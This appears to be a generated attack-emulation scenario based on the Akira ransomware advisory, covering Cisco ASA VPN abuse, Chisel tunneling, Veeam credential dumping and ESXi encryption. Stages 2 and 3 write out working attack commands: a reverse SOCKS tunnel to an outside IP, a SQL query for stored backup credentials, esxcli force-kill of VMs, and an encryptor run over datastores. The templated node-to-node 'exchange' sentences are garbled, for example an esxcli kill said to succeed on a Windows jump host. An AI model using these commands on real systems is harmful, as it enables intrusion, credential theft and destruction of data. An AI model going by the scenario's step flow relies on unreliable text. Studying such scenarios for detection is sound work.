scenario.name: Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)
scenario.overview: Imagine a corporate data center whose front lobby keycard reader still honors single-factor staff passwords without a pocket code. A burglar slips through the lobby door, threads a hidden garden hose out through a back vent to bring in extra helpers, raids the backup-vault clerk desk to steal the master building-basement keys, and then marches down to the basement to shut off every virtual apartment simultaneously and padlock their heavy foundation files. In this scenario (T1133, Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: cisco ASA / AnyConnect Single-Factor VPN, then chisel SOCKS Tunneling, Veeam Credential, then esxcli vm process kill. Steps #1–#3 walk that chain end-to-end by covering Cisco ASA / AnyConnect Single-Factor VPN, then Chisel SOCKS Tunneling, Veeam Credential, then esxcli vm process kill, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.

stages.title: Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)
stages.subtitle: Initial Access (T1133 - External Remote Services / T1190)
stages.description: Testing the exterior remote-access lobby door from an outside commercial warehouse, the intruder exploits a flaw in the single-password gate and walks cleanly into the internal office corridor without ever passing a second-factor badge check. Akira affiliates targeted WAN-facing Cisco ASA and Firepower Threat Defense (FTD) appliances, exploiting CVE-2020-3259 (an unauthenticated memory disclosure vulnerability that leaks active session tokens and credentials from ASA memory) or CVE-2023-20269 (an authorization bypass allowing brute-force and password-spray authentication against the built-in DefaultWEBVPNGroup connection profile without triggering MFA), establishing an encrypted AnyConnect VPN session. Many administrators configured Duo/Azure MFA on their custom VPN tunnel group (Corp-MFA-Tunnel) but left the built-in DefaultWEBVPNGroup or DefaultRAGroup active with local/LDAP password-only authentication. In the documented Firewall exchange from Akira Affiliate Operator to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1133 (confirming that the Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi). On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259) / ⇠#1 ACK T1133) from Node ① (#1 Akira Affiliate Operator) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 VMware ESXi Host (esxcli + Rust Akira)).

stages.title: Stage 2: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi
stages.subtitle: Credential Access & Command and Control (T1555 / T1572)
stages.description: Once inside the building, the intruder snakes a concealed reverse speaking tube out to their hideout, then visits the corporate backup-scheduler office to unlock its credential safe and lift the master keys to the basement hypervisor racks. Pivoting to an internal Windows server, the operator launched chisel.exe client https://<c2>:8443 R:socks (establishing a fast TCP-over-HTTP/WebSocket reverse SOCKS5 tunnel) and queried the local VeeamBackup Microsoft SQL database (SELECT user_name, password FROM [VeeamBackup].[dbo].[Credentials], decrypting the DPAPI-protected blobs to recover the cleartext root SSH credentials and vCenter service accounts used by Veeam to snapshot VMware ESXi hosts). Because backup servers require high-privilege access to every hypervisor and domain controller to perform backups, compromising the Veeam database gives the attacker immediate Tier-0 hypervisor credentials. In the documented EventID 1 exchange from Perimeter Firewall & NDR Tap to Cisco ASA / AnyConnect VPN Appliance, Cisco ASA / AnyConnect VPN Appliance responds with ACK 1 (confirming that the C:ProgramDatachisel.exe client https://185.220.101.42:8443 R:socks request succeeded on Cisco ASA / AnyConnect VPN Appliance and establishing the runtime state required for Step #3 Stage 3: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption). On the diagram, follow Step #2 / Link #2 (#2→ C:\ProgramData\chisel.exe client https://185.220.101.42:8443 R:socks / ⇠#2 ACK 1) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Cisco ASA / AnyConnect VPN Appliance), monitored by Node ⑥ (#6 VMware ESXi Host (esxcli + Rust Akira)).

stages.title: Stage 3: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption
stages.subtitle: Impact (T1489 - Service Stop / T1486 - Data Encrypted for Impact)
stages.description: Descending into the basement hypervisor hall with stolen master keys, the intruder flips the hard power breakers on every running virtual office so their disk bolts release, then unleashes a fast Rust padlocking machine that encrypts entire virtual servers in minutes. Using the stolen ESXi credentials over SSH, the operator executed a shell loop invoking esxcli vm process list and esxcli vm process kill --type=force --world-id=<id> (forcefully terminating every running vmx virtual machine hypervisor process so the ESXi kernel releases its exclusive file locks on .vmdk and .vswp virtual disk files) and launched the Rust-compiled Akira ELF encryptor (/tmp/akira_esxi -p /vmfs/volumes --fork, encrypting all datastore volumes with ChaCha20/RSA-4096). Because most enterprises do not install EDR agents directly inside the proprietary VMware ESXi VMkernel OS, encrypting from the hypervisor shell bypasses all guest-OS Windows/Linux EDR agents installed inside the VMs. In the documented EventID 1 exchange from Cisco ASA / AnyConnect VPN Appliance to Windows Jump Host (Chisel & Mimikatz), Windows Jump Host (Chisel & Mimikatz) responds with ALERT 1 (confirming that the esxcli vm process kill --type=force --world-id=2104892 request succeeded on Windows Jump Host (Chisel & Mimikatz) and completing the final execution objective of Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)). On the diagram, follow Step #3 / Link #3 (#3→ esxcli vm process kill --type=force --world-id=2104892 / ⇠#3 ALERT 1) from Node ③ (#3 Cisco ASA / AnyConnect VPN Appliance) to Node ④ (#4 Windows Jump Host (Chisel & Mimikatz)), monitored by Node ⑥ (#6 VMware ESXi Host (esxcli + Rust Akira)).
